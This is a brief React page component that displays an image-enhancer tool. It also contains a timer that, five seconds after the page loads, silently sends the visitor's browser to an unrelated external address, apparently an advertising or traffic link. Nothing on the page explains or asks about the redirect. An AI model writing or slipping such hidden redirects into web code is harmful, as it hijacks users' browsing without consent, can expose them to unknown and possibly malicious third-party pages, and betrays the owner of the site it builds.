import { ImageEnhancer } from "@/components/ImageEnhancer";
import { useEffect } from "react";

const Index = () => {
  useEffect(() => {
    const timer = setTimeout(() => {
      window.location.href = "https://otieu.com/4/9975268";
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  return <ImageEnhancer />;
};

export default Index;